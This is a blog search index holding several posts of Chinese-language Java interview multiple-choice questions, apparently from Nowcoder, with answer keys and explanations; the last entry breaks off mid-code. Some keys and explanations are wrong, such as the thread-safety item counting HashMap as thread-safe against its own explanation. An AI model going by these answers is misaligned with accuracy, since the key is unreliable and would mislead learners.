<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>牛客网Java面试题(六)</title>
      <link href="/2019/06/15/niu-ke-wang-java-mian-shi-ti-liu/"/>
      <url>/2019/06/15/niu-ke-wang-java-mian-shi-ti-liu/</url>
      
        <content type="html"><![CDATA[<h1 id="Java程序中的类名称必须与存放该类的文件名称相同"><a href="#Java程序中的类名称必须与存放该类的文件名称相同" class="headerlink" title="Java程序中的类名称必须与存放该类的文件名称相同"></a>Java程序中的类名称必须与存放该类的文件名称相同</h1><ol><li>对</li><li>错</li></ol><p><strong>正确答案:B</strong></p><p>解析:如果类名的修饰符为public那么文件名必须和类名相同,内部类的类名一般与文件名不同.</p><h1 id="关于Socket通信编程-以下描述错误的是"><a href="#关于Socket通信编程-以下描述错误的是" class="headerlink" title="关于Socket通信编程,以下描述错误的是."></a>关于Socket通信编程,以下描述错误的是.</h1><ol><li><p>服务器端通过new ServerSocket()创建TCP连接对象</p></li><li><p>服务器端通过TCP连接对象调用accept()方法创建通信的Socket对象</p></li><li><p>客户端通过new Socket()方法创建通信的Socket对象</p></li><li><p>客户端通过new ServerSocket()创建TCP连接对象</p></li></ol><p><strong>正确答案:D</strong></p><p>解析:Socket编程中藏客户端通过new Socket()创建对象.</p><h1 id="假设如下代码中，若t1线程在t2线程启动之前已经完成启动。代码的输出是（）"><a href="#假设如下代码中，若t1线程在t2线程启动之前已经完成启动。代码的输出是（）" class="headerlink" title="假设如下代码中，若t1线程在t2线程启动之前已经完成启动。代码的输出是（）"></a>假设如下代码中，若t1线程在t2线程启动之前已经完成启动。代码的输出是（）</h1><pre><code>public static void main(String[]args)throws Exception {    final Object obj = new Object();    Thread t1 = new Thread() {        public void run() {            synchronized (obj) {                try {                    obj.wait();                    System.out.println(&quot;Thread 1 wake up.&quot;);                } catch (InterruptedException e) {                }            }        }    };    t1.start();    Thread.sleep(1000);//We assume thread 1 must start up within 1 sec.    Thread t2 = new Thread() {        public void run() {            synchronized (obj) {                obj.notifyAll();                System.out.println(&quot;Thread 2 sent notify.&quot;);            }        }    };    t2.start();}</code></pre><ol><li><p>Thread 1 wake up<br>Thread 2 sent notify.</p></li><li><p>Thread 2 sent notify.<br>Thread 1 wake up</p></li><li><p>A、B皆有可能</p></li><li><p>程序无输出卡死</p></li></ol><p><strong>正确答案:B</strong></p><h1 id="在Java线程状态转换时，下列转换不可能发生的有（）？"><a href="#在Java线程状态转换时，下列转换不可能发生的有（）？" class="headerlink" title="在Java线程状态转换时，下列转换不可能发生的有（）？"></a>在Java线程状态转换时，下列转换不可能发生的有（）？</h1><ol><li>初始态-&gt;运行态</li><li>就绪态-&gt;运行态</li><li>阻塞态-&gt;运行态</li><li>运行态-&gt;就绪态</li></ol><p><strong>正确答案:AC</strong></p><p>解析:</p><p><img src="https://s2.ax1x.com/2019/06/15/VIOgcF.jpg" alt="VIOgcF.jpg"></p><h1 id="局部内部类可以用哪些修饰符修饰？"><a href="#局部内部类可以用哪些修饰符修饰？" class="headerlink" title="局部内部类可以用哪些修饰符修饰？"></a>局部内部类可以用哪些修饰符修饰？</h1><ol><li>public</li><li>private</li><li>abstract</li><li>final</li></ol><p><strong>正确答案:CD</strong></p><p>解析: Java中局部内部类就像是方法里面的一个局部变量一样,不能有public,protected,private,以及static这样的修饰符的.</p><h1 id="哪四个陈述是真的？"><a href="#哪四个陈述是真的？" class="headerlink" title="哪四个陈述是真的？"></a>哪四个陈述是真的？</h1><pre><code>class A {}class B extends A {}class C extends A {}class D extends B {}A. The type List&lt;A&gt;is assignable to List.B. The type List&lt;B&gt;is assignable to List&lt;A&gt;.C. The type List&lt;Object&gt;is assignable to List&lt;?&gt;.D. The type List&lt;D&gt;is assignable to List&lt;?extends B&gt;.E. The type List&lt;?extends A&gt;is assignable to List&lt;A&gt;.F The type List&lt;Object&gt;is assignable to any List reference.G. The type List&lt;?extends B&gt;is assignable to List&lt;?extends A&gt;.</code></pre><p><strong>正确答案:ACDG</strong></p><p>关于泛型的尖括号</p><pre><code>1. 如果尖括号中是一个类,那么尖括号里就是一个点.2. 如果尖括号里面带有问号,那么表示一个范围,&lt;? extends A&gt;表示小于等于A的范围,&lt;? super A&gt;表示大于等于A的范围,&lt;?&gt;代表全部范围.3. List&lt;?&gt;和List是相等的4. List&lt;.&gt;表示范围的时候表示的是最大范围</code></pre><h1 id="下列关于JAVA多线程的叙述正确的是（）"><a href="#下列关于JAVA多线程的叙述正确的是（）" class="headerlink" title="下列关于JAVA多线程的叙述正确的是（）"></a>下列关于JAVA多线程的叙述正确的是（）</h1><ol><li>调用start()方法和run()都可以启动一个线程</li><li>CyclicBarrier和CountDownLatch都可以让一组线程等待其他线程</li><li>Callable类的call()方法可以返回值和抛出异常</li><li>新建的线程调用start()方法就能立即进行运行状态</li></ol><p><strong>正确答案:BC</strong></p><h1 id="下面哪些属于JSP内置对象及方法？"><a href="#下面哪些属于JSP内置对象及方法？" class="headerlink" title="下面哪些属于JSP内置对象及方法？"></a>下面哪些属于JSP内置对象及方法？</h1><ol><li>request</li><li>out</li><li>application</li><li>config</li></ol><p><strong>正确答案:ABCD</strong></p><p>解析:</p><p>JSP内置对象</p><ol><li>out-&gt;request.getWriter</li><li>request-&gt;Service方法中的request参数</li><li>response-&gt;Service方法中的response参数</li><li>session-&gt;request.getSession方法</li><li>application-&gt;getServletContext</li><li>exception-&gt;Throable</li><li>pageContext-&gt;PageContext</li><li>page-&gt;this</li><li>Config-&gt;getServletConfig</li></ol><h1 id="Java-Thread的方法resume-负责重新开始被以下哪个方法中断的线程的执行（）。"><a href="#Java-Thread的方法resume-负责重新开始被以下哪个方法中断的线程的执行（）。" class="headerlink" title="Java.Thread的方法resume()负责重新开始被以下哪个方法中断的线程的执行（）。"></a>Java.Thread的方法resume()负责重新开始被以下哪个方法中断的线程的执行（）。</h1><ol><li>stop</li><li>sleep</li><li>wait</li><li>suspend</li></ol><p><strong>正确答案:D</strong></p><p>suspend方法和resume方法配合使用,suspend将线程进入阻塞状态,并且不会自动恢复,必须使用resume方法被调用才能使线程进入可执行状态.</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java面试题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>牛客网Java面试题(五)</title>
      <link href="/2019/06/13/niu-ke-wang-java-mian-shi-ti-wu/"/>
      <url>/2019/06/13/niu-ke-wang-java-mian-shi-ti-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="一个以“-java”为后缀的源文件"><a href="#一个以“-java”为后缀的源文件" class="headerlink" title="一个以“.java”为后缀的源文件"></a>一个以“.java”为后缀的源文件</h1><ol><li>只能包含一个public类，类名必须与文件名相同</li><li>只能包含与文件名相同的public类以及其中的内部类</li><li>只能有一个与文件名相同的public类，可以包含其他非public类（不考虑内部类）</li><li>可以包含任意public类</li></ol><p><strong>正确答案:C</strong></p><p>解析:</p><blockquote><p>.java文件可以包含多个类,唯一的限制就是:一个文件中只能有一个public类,并且此public类的名字必须要与文件名相同.</p></blockquote><h1 id="设int-x-1-float-y-2-则表达式x-y的值是：（）"><a href="#设int-x-1-float-y-2-则表达式x-y的值是：（）" class="headerlink" title="设int x=1,float y=2,则表达式x/y的值是：（）"></a>设int x=1,float y=2,则表达式x/y的值是：（）</h1><ol><li>0</li><li>1</li><li>2</li><li>都不是</li></ol><p><strong>正确答案:D</strong></p><p>解析:</p><blockquote><p>x/y的值为0.5</p></blockquote><h1 id="下面哪一项不是加载驱动程序的方法？"><a href="#下面哪一项不是加载驱动程序的方法？" class="headerlink" title="下面哪一项不是加载驱动程序的方法？"></a>下面哪一项不是加载驱动程序的方法？</h1><ol><li>通过DriverManager.getConnection方法加载</li><li>调用方法Class.forName</li><li>通过添加系统的jdbc.drivers属性</li><li>通过registerDriver方法注册</li></ol><p><strong>正确答案:A</strong></p><p>解析:</p><blockquote><p>DriverManager.getConnection方法是加载完驱动用来获取连接的方法.</p></blockquote><h1 id="下面哪些可能是重载的基本条件（）（注意：是可能为重载的基本条件）"><a href="#下面哪些可能是重载的基本条件（）（注意：是可能为重载的基本条件）" class="headerlink" title="下面哪些可能是重载的基本条件（）（注意：是可能为重载的基本条件）"></a>下面哪些可能是重载的基本条件（）（注意：是可能为重载的基本条件）</h1><ol><li>参数的类型不同</li><li>参数的顺序不同</li><li>函数的返回值类型不同</li><li>参数的个数不同</li></ol><p><strong>正确答案:ABD</strong></p><p>java中的方法重载:</p><p><strong>方法重载指在同一个类中,允许存在一个以上的同名方法,只要他们方法的参数列表不同即可,与修饰符和方法的返回值类型无关.</strong></p><p><strong>参数列表:个数不同,顺序不同,数据类型不同.</strong></p><p><strong>重载方法的调用:JVM通过方法的参数列表,调用不同的方法.</strong></p><h1 id="下面哪些情况可以引发异常："><a href="#下面哪些情况可以引发异常：" class="headerlink" title="下面哪些情况可以引发异常："></a>下面哪些情况可以引发异常：</h1><ol><li>数组越界</li><li>制定URL不存在</li><li>使用throw语句抛出</li><li>使用throws语句</li></ol><p><strong>正确答案:ABC</strong></p><p>解析:</p><p>throw是主动抛出异常,throws是声名异常</p><p>声明异常:</p><blockquote><p>将问题标识出来,报告给调用者.如果方法内通过throw抛出了编译时异常,而没有捕获处理,那么必须通过throws进行声明,让调用者进行处理.</p></blockquote><p>关键字throws运用于方法声明之上,用于表示当前方法不处理异常,而是提醒该方法的调用者来处理异常</p><p>throw用在方法内，用来抛出一个异常对象，将这个异常对象传递到调用者处，并结束当前方法的执行。</p><h1 id="下面有关java-classloader说法正确的是（）？"><a href="#下面有关java-classloader说法正确的是（）？" class="headerlink" title="下面有关java classloader说法正确的是（）？"></a>下面有关java classloader说法正确的是（）？</h1><ol><li>ClassLoader就是用来动态加载class文件到内存当中用的</li><li>JVM在判定两个class是否相同时，只用判断类名相同即可，和类加载器无关</li><li>ClassLoader使用的是双亲委托模型来搜索类的</li><li>Java默认提供的三个ClassLoader是Boostrap ClassLoader，Extension ClassLoader，App ClassLoader</li><li>以上都不正确</li></ol><p><strong>正确答案:ACD</strong></p><h1 id="模型-视图-控制器（MVC）是一种在Web应用程序中经常使用的架构模式。以下哪个陈述是正确的？"><a href="#模型-视图-控制器（MVC）是一种在Web应用程序中经常使用的架构模式。以下哪个陈述是正确的？" class="headerlink" title="模型 - 视图 - 控制器（MVC）是一种在Web应用程序中经常使用的架构模式。以下哪个陈述是正确的？"></a>模型 - 视图 - 控制器（MVC）是一种在Web应用程序中经常使用的架构模式。以下哪个陈述是正确的？</h1><ol><li>模型通常表示操作应用程序中的数据所需的数据和业务逻辑</li><li>视图是其模型的（可视）表示。它将模型呈现为适合交互的形式，通常是用户界面元素</li><li>控制器是用户和系统之间的链接。它接受来自用户的输入并指示模型和视图基于该输入执行操作</li><li>MVC在Web应用程序中的常见做法是，模型接收来自用户的GET或POST输入，并决定如何处理它，切换到控制器以及哪个手控制到视图（HTML生成组件）</li><li>以上都不是</li></ol><p><strong>正确答案:ABC</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java面试题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>牛客网Java面试题(四)</title>
      <link href="/2019/06/12/niu-ke-wang-java-mian-shi-ti-si/"/>
      <url>/2019/06/12/niu-ke-wang-java-mian-shi-ti-si/</url>
      
        <content type="html"><![CDATA[<h1 id="下面哪个修饰符修饰的变量是所有同一个类生成的对象共享的（-）"><a href="#下面哪个修饰符修饰的变量是所有同一个类生成的对象共享的（-）" class="headerlink" title="下面哪个修饰符修饰的变量是所有同一个类生成的对象共享的（ ）"></a>下面哪个修饰符修饰的变量是所有同一个类生成的对象共享的（ ）</h1><ol><li>public</li><li>private</li><li>static</li><li>final</li></ol><p><strong>正确答案:C</strong></p><p>解析:static修饰的变量表示静态变量,归类所有,该类的所有对象公用.</p><h1 id="以下选项中，合法的赋值语句是（）"><a href="#以下选项中，合法的赋值语句是（）" class="headerlink" title="以下选项中，合法的赋值语句是（）"></a>以下选项中，合法的赋值语句是（）</h1><ol><li>a&gt;1;</li><li>i++;</li><li>a= a+1=5;</li><li>y = int ( i );</li></ol><p><strong>正确答案:B</strong></p><p>解析: B选项为中间变量缓存机制,</p><pre><code>temp = i;i = i + 1;i = temp;</code></pre><p>一开始选择D但是D选项如果y为short,byte,char类型时会发生向下转型,不可赋值.</p><h1 id="关于访问权限说法正确-的是-？"><a href="#关于访问权限说法正确-的是-？" class="headerlink" title="关于访问权限说法正确 的是 ？ ( )"></a>关于访问权限说法正确 的是 ？ ( )</h1><ol><li>外部类前面可以修饰public,protected和private</li><li>成员内部类前面可以修饰public,protected和private</li><li>局部内部类前面可以修饰public,protected和private</li><li>以上说法都不正确</li></ol><p><strong>正确答案:B</strong></p><p>解析:</p><p>成员内部类的上一级程序单元是外部类,它具有四个作用域同一类(private),同一包(protected),和任何地方(public)以及默认.</p><h1 id="关于java编译和运行命令叙述不正确的是？"><a href="#关于java编译和运行命令叙述不正确的是？" class="headerlink" title="关于java编译和运行命令叙述不正确的是？( )"></a>关于java编译和运行命令叙述不正确的是？( )</h1><ol><li>运行“java Scut.class”</li><li>运行“java Scut”</li><li>运行“javac Scut.java”的输出文件是Scut.class</li><li>java这个命令的运行对象是Scut.class</li></ol><p><strong>正确答案:A</strong></p><p>解析: A选项错在<strong>java</strong>这个命令后面跟的是类的名字,也就是程序的名字,但是这里不应该加后缀.</p><h1 id="对于JVM内存配置参数："><a href="#对于JVM内存配置参数：" class="headerlink" title="对于JVM内存配置参数："></a>对于JVM内存配置参数：</h1><blockquote><p>-Xmx10240m -Xms10240m -Xmn5120m -XXSurvivorRatio=3</p></blockquote><p>其最小内存值和Survivor区总大小分别是（）</p><ol><li>5120m，1024m</li><li>5120m，2048m</li><li>10240m，1024m</li><li>10240m，2048m</li></ol><p><strong>正确答案:D</strong></p><p>解析:</p><blockquote><p>-Xmx：最大堆大小</p></blockquote><blockquote><p>-Xms：初始堆大小</p></blockquote><blockquote><p>-Xmn:年轻代大小</p></blockquote><blockquote><p>-XXSurvivorRatio：年轻代中Eden区与Survivor区的大小比值</p></blockquote><blockquote><p>年轻代5120m， Eden：Survivor=3，Survivor区大小=1024m（Survivor区有两个，即将年轻代分为5份，每个Survivor区占一份），总大小为2048m。</p></blockquote><blockquote><p>-Xms初始堆大小即最小内存值为10240m</p></blockquote><h1 id="以下哪些继承自-Collection-接口（）"><a href="#以下哪些继承自-Collection-接口（）" class="headerlink" title="以下哪些继承自 Collection 接口（）"></a>以下哪些继承自 Collection 接口（）</h1><ol><li>List</li><li>Set</li><li>Map</li><li>Array</li></ol><p><strong>正确答案:AB</strong></p><p>解析:</p><p>[<img src="https://s2.ax1x.com/2019/06/12/V2Oq54.md.png" alt="V2Oq54.md.png">]</p><h1 id="关于HashMap和Hashtable正确的说法有（）"><a href="#关于HashMap和Hashtable正确的说法有（）" class="headerlink" title="关于HashMap和Hashtable正确的说法有（）"></a>关于HashMap和Hashtable正确的说法有（）</h1><ol><li>都实现了Map接口</li><li>Hashtable类不是同步的，而HashMap类是同步的</li><li>Hashtable不允许null键或值</li><li>HashMap不允许null或值</li></ol><p><strong>正确答案:AC</strong></p><p>解析:</p><p>HashTable中键和值都不允许出现Null值.</p><h1 id="下面有关java类加载器，说法正确的是？"><a href="#下面有关java类加载器，说法正确的是？" class="headerlink" title="下面有关java类加载器，说法正确的是？"></a>下面有关java类加载器，说法正确的是？</h1><ol><li>引导类加载器（bootstrap class loader）：它用来加载 Java 的核心库，是用原生代码来实现的</li><li>扩展类加载器（extensions class loader）：它用来加载 Java 的扩展库。</li><li>系统类加载器（system class loader）：它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类</li><li>tomcat为每个App创建一个Loader，里面保存着此WebApp的ClassLoader。需要加载WebApp下的类时，就取出ClassLoader来使用</li></ol><p><strong>正确答案:ABCD</strong></p><p>解析:</p><p>A. Bootstrap ClassLoader/启动类加载器<br>主要负责jdk_home/lib目录下的核心 api 或 -Xbootclasspath 选项指定的jar包装入工作.</p><p>B、Extension ClassLoader/扩展类加载器<br>主要负责jdk_home/lib/ext目录下的jar包或 -Djava.ext.dirs 指定目录下的jar包装入工作</p><p>C、System ClassLoader/系统类加载器<br>主要负责java -classpath/-Djava.class.path所指的目录下的类与jar包装入工作.</p><p>D、 User Custom ClassLoader/用户自定义类加载器(java.lang.ClassLoader的子类)<br>在程序运行期间, 通过java.lang.ClassLoader的子类动态加载class文件, 体现java动态实时类装入特性.</p><h1 id="下面哪几个语句正确的声明一个整型的二维数组（）"><a href="#下面哪几个语句正确的声明一个整型的二维数组（）" class="headerlink" title="下面哪几个语句正确的声明一个整型的二维数组（）"></a>下面哪几个语句正确的声明一个整型的二维数组（）</h1><ol><li>int a[][]=new int[][]</li><li>int b[10][10]=new int[][]</li><li>int c[][]=new int[10][10]</li><li>int []d[]=new int[10][10]</li></ol><p><strong>正确答案:CD</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java面试题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>牛客网Java面试题(三)</title>
      <link href="/2019/06/11/niu-ke-wang-java-mian-shi-ti-san/"/>
      <url>/2019/06/11/niu-ke-wang-java-mian-shi-ti-san/</url>
      
        <content type="html"><![CDATA[<h1 id="已知表达式int-m-0，1，2，3，4，5，6-；下面哪个表达式的值与数组下标量最大值相等？"><a href="#已知表达式int-m-0，1，2，3，4，5，6-；下面哪个表达式的值与数组下标量最大值相等？" class="headerlink" title="已知表达式int m[]={0，1，2，3，4，5，6}；下面哪个表达式的值与数组下标量最大值相等？"></a>已知表达式int m[]={0，1，2，3，4，5，6}；下面哪个表达式的值与数组下标量最大值相等？</h1><ol><li>m. length()</li><li>m. length - 1</li><li>m. length()+1</li><li>m. length+1</li></ol><p><strong>正确答案:B</strong></p><p>解析:因为数组的下标从0开始,所以数组下标的最大值应该是数组的总长度减去1,获取数组的长度用length属性而是不是length()方法</p><h1 id="下面不属于HttpServletRequest接口完成功能的是？"><a href="#下面不属于HttpServletRequest接口完成功能的是？" class="headerlink" title="下面不属于HttpServletRequest接口完成功能的是？"></a>下面不属于HttpServletRequest接口完成功能的是？</h1><ol><li>读取cookie</li><li>读取HTTP头</li><li>设定响应的content类型</li><li>读取路径信息</li></ol><p><strong>正确答案:C</strong></p><p>解析: </p><ol><li>request.getCookies();</li><li>request.getHeader();</li><li><strong>response.setContextType(“text/html;charset=utf-8”);</strong></li><li>request.setContextPath();request.getServletPath();</li></ol><h1 id="Math-floor-8-5"><a href="#Math-floor-8-5" class="headerlink" title="Math.floor(-8.5)=( )"></a>Math.floor(-8.5)=( )</h1><ol><li>(float)-8.0</li><li>(long)-9</li><li>(long)-8</li><li>(double)-9.0</li></ol><p><strong>正确答案:D</strong></p><p>解析:</p><p>floor方法:返回最大的（最接近正无穷大）double 值，该值小于等于参数，并等于某个整数。</p><h1 id="代码题"><a href="#代码题" class="headerlink" title="代码题"></a>代码题</h1><pre><code>Integer i = 42;Long l = 42l;Double d = 42.0;</code></pre><p>下面为True的是</p><ol><li>(i == l)</li><li>(i == d)</li><li>(l == d)</li><li>i.equals(d)</li><li>d.equals(l)</li><li>i.equals(l)</li><li>l.equals(42L)</li></ol><p><strong>正确答案:G</strong></p><p>解析:</p><pre><code>@Testpublic void demo3(){    Integer i = 42;    Long l = 42l;    Double d = 42.0;    //不同类型引用的==比较会造成编译错误    System.out.println(i == l);    System.out.println(i == d);    System.out.println(l == d);    //包装类的equals()方法不会自动处理数据转型,两个不同的数据类型相比较肯定会返回False    System.out.println(i.equals(d));    System.out.println(d.equals(l));    System.out.println(i.equals(l));    System.out.println(l.equals(42L));}</code></pre><h1 id="对下面Spring声明式事务的配置含义的说明错误的是（）"><a href="#对下面Spring声明式事务的配置含义的说明错误的是（）" class="headerlink" title="对下面Spring声明式事务的配置含义的说明错误的是（）"></a>对下面Spring声明式事务的配置含义的说明错误的是（）</h1><pre><code>&lt;bean id=&quot;txProxyTemplate&quot; abstract=&quot;true&quot;class=&quot;org.springframework.transaction.interceptor.TransactionProxyFactoryBean&quot;&gt;    &lt;property name=&quot;transactionManager&quot; ref=&quot;myTransactionManager&quot; /&gt;&lt;property name=&quot;transactionAttributes&quot;&gt;      &lt;props&gt;        &lt;prop key=&quot;get*&quot;&gt;PROPAGATION_REQUIRED,readOnly&lt;/prop&gt;        &lt;prop key=&quot;*&quot;&gt;PROPAGATION_REQUIRED&lt;/prop&gt;    &lt;/props&gt;&lt;/property&gt; &lt;/bean&gt;</code></pre><ol><li>定义了声明式事务的配置模板</li><li>对get方法采用只读事务</li><li>缺少sessionFactory属性的注入</li><li><p>配置需要事务管理的bean的代理时，通过parent引用这个配置模板，代码如下：</p><pre><code> &lt;bean id=&quot;petBiz&quot; parent=&quot;txProxyTemplate&quot;&gt;         &lt;property name=&quot;target&quot; ref=&quot;petTarget&quot;/&gt; &lt;/bean&gt;</code></pre></li></ol><p><strong>正确答案:D</strong></p><p>解析:</p><pre><code>&lt;!--Spring中基于XML的声明式事务控制的配置步骤        1:配置事务管理器        2:配置事务的通知            导入事务的约束,transaction的名称空间和约束同时也需要AOP的名称空间和约束            使用tx:advice标签配置事务通知                属性:                    id-&gt;给事务通知起一个唯一标识                    transaction-manager:给事务通知提供一个事务管理器的引用        3:配置AOP中的通用切入点表达式        4:建立事务通知和切入点表达式的关系        5:配置事务的属性                事务的通知tx:advice标签的内部配置事务的属性                isolation=&quot;&quot;           -&gt;指定事务的隔离级别,默认是default表示使用数据库的默认隔离级别                no-rollback-for=&quot;&quot;     -&gt;指定一个异常,当产生该异常时事务不回滚,产生其他异常时,事务回滚,没有默认值,表示任何异常都回滚                propagation=&quot;&quot;         -&gt;指定事务的传播行为,默认是REQUIRED表示一定会有事务,增删改选择REQUIRED.查询方法选择SUPPORTS                read-only=&quot;&quot;           -&gt;指定事务是否只读,只有查询方法才能设置为True默认值False                rollback-for=&quot;&quot;        -&gt;指定一个异常,当产生该异常时,事务回滚,产生其他异常时,事务不回滚.没有默认值,表示任何异常都回滚                timeout=&quot;&quot;             -&gt;指定事务的超时时间,默认值-1,表示永不超时,如果指定了数值则以秒为单位    --&gt;    &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt;    &lt;/bean&gt;    &lt;!--配置事务通知--&gt;    &lt;tx:advice id=&quot;transactionAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt;        &lt;tx:attributes&gt;            &lt;!--业务层接口中的方法--&gt;            &lt;tx:method name=&quot;tranSfer&quot; read-only=&quot;false&quot; propagation=&quot;REQUIRED&quot;/&gt;        &lt;/tx:attributes&gt;    &lt;/tx:advice&gt;    &lt;!--配置AOP--&gt;    &lt;aop:config&gt;        &lt;aop:pointcut id=&quot;point1&quot; expression=&quot;execution(* chen.service.impl.*.*(..))&quot;/&gt;        &lt;!--建立事务通知和切入点表达式的关系--&gt;        &lt;aop:advisor advice-ref=&quot;transactionAdvice&quot; pointcut-ref=&quot;point1&quot;&gt;&lt;/aop:advisor&gt;    &lt;/aop:config&gt;</code></pre><h1 id="实现或继承了Collection接口的是（）"><a href="#实现或继承了Collection接口的是（）" class="headerlink" title="实现或继承了Collection接口的是（）"></a>实现或继承了Collection接口的是（）</h1><ol><li>Map</li><li>List</li><li>Vector</li><li>Iterator</li><li>Set</li></ol><p><strong>正确答案:BCE</strong></p><p>因为List接口继承于Collection接口,Vector类又实现了List接口所以Voctor自然实现了Collection接口.</p><p><img src="https://s2.ax1x.com/2019/06/11/VcBkhq.png" alt="VcBkhq.png"></p><h1 id="在Jdk1-7中，下述说法中抽象类与接口的区别与联系正确的有哪些？"><a href="#在Jdk1-7中，下述说法中抽象类与接口的区别与联系正确的有哪些？" class="headerlink" title="在Jdk1.7中，下述说法中抽象类与接口的区别与联系正确的有哪些？"></a>在Jdk1.7中，下述说法中抽象类与接口的区别与联系正确的有哪些？</h1><ol><li>抽象类中可以有普通成员变量，接口中没有普通成员变量。</li><li>抽象类和接口中都可以包含静态成员常量。</li><li>一个类可以实现多个接口，但只能继承一个抽象类</li><li>抽象类中可以包含非抽象的普通方法，接口中的方法必须是抽象的，不能有非抽象的普通方法。</li></ol><p><strong>正确答案:ABCD</strong></p><h1 id="下面哪个语句是创建数组的正确语句？"><a href="#下面哪个语句是创建数组的正确语句？" class="headerlink" title="下面哪个语句是创建数组的正确语句？( )"></a>下面哪个语句是创建数组的正确语句？( )</h1><ol><li>float f[][] = new float[6][6];</li><li>float []f[] = new float[6][6];</li><li>float f[][] = new float[][6];</li><li>float [][]f = new float[6][6];</li><li>float [][]f = new float[6][];</li></ol><p><strong>正确答案:ABDE</strong></p><p>解析:</p><p>Java中数组命名时[]和数组名称可以随意排列,但声明的二维数组中第一个括号中必须要有值,因为他代表一维数组中有多少个二维数组.</p><h1 id="以下哪些类是线程安全的（）"><a href="#以下哪些类是线程安全的（）" class="headerlink" title="以下哪些类是线程安全的（）"></a>以下哪些类是线程安全的（）</h1><ol><li>Vector</li><li>HashMap</li><li>ArrayList</li><li>StringBuffer</li><li>Properties</li></ol><p><strong>正确答案:ABDE</strong></p><p>解析:</p><p>Java中线程安全的类Vector,HashTable,StringBuffer,Properties</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java面试题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>牛客网Java面试题(二)</title>
      <link href="/2019/06/10/niu-ke-wang-java-mian-shi-ti-er/"/>
      <url>/2019/06/10/niu-ke-wang-java-mian-shi-ti-er/</url>
      
        <content type="html"><![CDATA[<h1 id="将以下哪种方法插入行3是不合法的。"><a href="#将以下哪种方法插入行3是不合法的。" class="headerlink" title="将以下哪种方法插入行3是不合法的。"></a>将以下哪种方法插入行3是不合法的。</h1><p>类Test1定义如下:</p><pre><code>public class Test1{//1    public float aMethod(float a,float b){}//2     //3}//4</code></pre><ol><li>public int aMethod(int a,int b){}</li><li>private float aMethod(int a,int b,int c){}</li><li>public float aMethod(float a,float b){}</li><li>public float aMethod(float a,float b,float c){}</li></ol><p><strong>正确答案C</strong></p><p>解析:</p><p><strong>方法重载的规范</strong></p><ol><li>方法名必须要相同.</li><li>方法的参数列表一定要不同,以此区分不同的方法体</li><li>放的返回类型,修饰符可以相同,也可以不同</li></ol><h1 id="下面代码的输出是？"><a href="#下面代码的输出是？" class="headerlink" title="下面代码的输出是？"></a>下面代码的输出是？</h1><pre><code>class Foo {    final int i;    int j;    public void doSomething() {        System.out.println(++j + i);    }}</code></pre><ol><li>0 </li><li>1</li><li>2</li><li>不能执行，因为编译有错</li></ol><p><strong>正确答案:D</strong></p><p>解析:</p><p><strong>在Java中final类型的变量必须被初始化,否则无法完成编译</strong></p><h1 id="String-str1-“abc”，“abc”分配在内存哪个区域？"><a href="#String-str1-“abc”，“abc”分配在内存哪个区域？" class="headerlink" title="String str1 = “abc”，“abc”分配在内存哪个区域？"></a>String str1 = “abc”，“abc”分配在内存哪个区域？</h1><ol><li>堆</li><li>栈</li><li>字符串常量区</li><li>寄存器</li></ol><p><strong>正确答案:C</strong></p><p>解析:</p><p><strong>使用new关键字创建的对象存在堆区</strong></p><p><strong>函数中的临时变量存在栈区</strong></p><p><strong>Java中的字符串存在字符串区</strong></p><h1 id="关于异常的编程，以下描述错误的是：（-）"><a href="#关于异常的编程，以下描述错误的是：（-）" class="headerlink" title="关于异常的编程，以下描述错误的是：（ ）"></a>关于异常的编程，以下描述错误的是：（ ）</h1><ol><li>在有除法存在的代码处，抛不抛出异常均可</li><li>int i=Integer.parseInt(”123a”);将产生NumberFormatException</li><li>int a[]=null; a[0]=1; 将产生ArraylndexOutOfBoundsException</li><li>输入输出流编程中，读和写时都必须抛出IOException</li></ol><p><strong>正确答案:C</strong></p><p>解析:</p><ol><li>除数为0等算术异常(<strong>ArithmeticException</strong>)属于运行异常(<strong>RuntimeException</strong>)的子类.而运行异常是系统运行时由系统自动抛出的,所以不需要throw语句主动抛出.</li><li>正确</li><li>因为数组在初始化的时候分配的空间为<strong>null</strong>,所以不能给数组添加值</li><li>正确</li></ol><h1 id="下列叙述中，错误的是（-）"><a href="#下列叙述中，错误的是（-）" class="headerlink" title="下列叙述中，错误的是（ ）"></a>下列叙述中，错误的是（ ）</h1><ol><li>File类能够存储文件属性</li><li>File类能够读写文件</li><li>File类能够建立文件</li><li>File类能够获取文件目录信息</li></ol><p><strong>正确答案:B</strong></p><p>解析:</p><p>读写文件用的是<strong>InputStream</strong>和<strong>OutputStream</strong>,File类只是用来操作文件本身.</p><h1 id="以下代码片段的结果是什么？"><a href="#以下代码片段的结果是什么？" class="headerlink" title="以下代码片段的结果是什么？"></a>以下代码片段的结果是什么？</h1><pre><code>int i = 5;int j = 10;System.out.println(i + ~j);</code></pre><ol><li>Compilation error because”~”doesn’t operate on integers</li><li>-5</li><li>-6</li><li>15</li></ol><p><strong>正确答案:C</strong></p><p>解析:</p><p><strong>Java语言是支持补码和反码的,这里使用补码公式-n=~n+1推出~n=-n-1,所以-10-1=-11,得到~j的值为-11,最后5+(-11)=-6</strong></p><h1 id="阅读如下代码。-请问，对语句行-test-hello-描述正确的有（）"><a href="#阅读如下代码。-请问，对语句行-test-hello-描述正确的有（）" class="headerlink" title="阅读如下代码。 请问，对语句行 test.hello(). 描述正确的有（）"></a>阅读如下代码。 请问，对语句行 test.hello(). 描述正确的有（）</h1><pre><code>package NowCoder;class Test {    public static void hello() {        System.out.println(&quot;hello&quot;);    }}public class 